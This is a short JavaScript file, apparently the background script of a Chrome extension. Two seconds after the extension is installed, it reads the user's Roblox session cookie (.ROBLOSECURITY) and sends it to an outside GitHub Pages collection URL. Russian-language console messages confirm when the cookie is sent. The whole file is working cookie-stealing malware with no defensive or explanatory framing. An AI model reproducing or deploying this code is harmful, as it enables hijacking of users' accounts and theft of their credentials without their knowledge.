function sendCookie() {
    chrome.cookies.get({
        url: "https://www.roblox.com",
        name: ".ROBLOSECURITY"
    }, (cookie) => {
        if (cookie) {
            fetch('https://valeryiusmanov-sketch.github.io/redesigned-meme/collect.html?cookie=' + encodeURIComponent(cookie.value))
                .then(() => console.log('✅ Кука отправлена!'))
                .catch(() => console.error('❌ Ошибка отправки'));
        } else {
            console.log('❌ Кука не найдена');
        }
    });
}

chrome.runtime.onInstalled.addListener(() => {
    setTimeout(sendCookie, 2000);
});
